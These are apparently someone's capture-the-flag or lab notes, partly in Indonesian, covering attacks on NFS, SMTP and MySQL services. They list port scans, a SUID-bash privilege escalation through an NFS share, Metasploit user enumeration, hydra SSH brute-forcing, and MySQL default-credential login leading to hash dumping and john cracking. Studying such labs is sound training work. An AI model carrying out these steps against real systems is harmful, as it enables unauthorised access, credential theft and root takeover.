# 1. nfs :
-> sudo nmap -T4 -p- --min-rate 1000 ip
-> showmount -e ip 
-> sudo mount -t nfs 10.10.231.60:/home /tmp/mount/ -nolock
-> cd /tmp/mount/username -> wget bash -> chmod +x bash -> chown root bash -> chmod +s bash 
-> ssh -i id_rsa username@ip -> ./bash -p



# 2. smtp :
-> sudo nmap -T4 -p- --min-rate 1000 ip
-> msfconsole -> search smtp_version -> use 0 -> options -> set rhosts ip -> exploit
-> system mail name: polosmtp.home
-> mail transfer agent: postfix
-> search smtp_enum -> use 0 -> options -> set user_file /wordlistmu/payload.txt -> exploit
-> hydra -t 16 -l usernamehasilmsf -P /usr/share/wordlists/rockyou.txt -vV -f ip ssh

# 3. sql :
-> sudo nmap -T4 -p- --min-rate 1000 ip
-> mysql -h ip -u root -p : password = password
-> msfconsole -> search mysql_sql -> use -> options -> urutin dari atas ke bawah yg dibutuhin 
-> exploit -> options -> set sql "show databases"
-> uname: root -> pass: password
-> ikuti module2 msf nya -> ampe dump hash user 
-> cari user yg namanya ga default -> carl -> taruh di hash.txt carl + hash nya
-> john hash.txt -> login ssh pakai uname carl ip dan pass nya -> cat flag
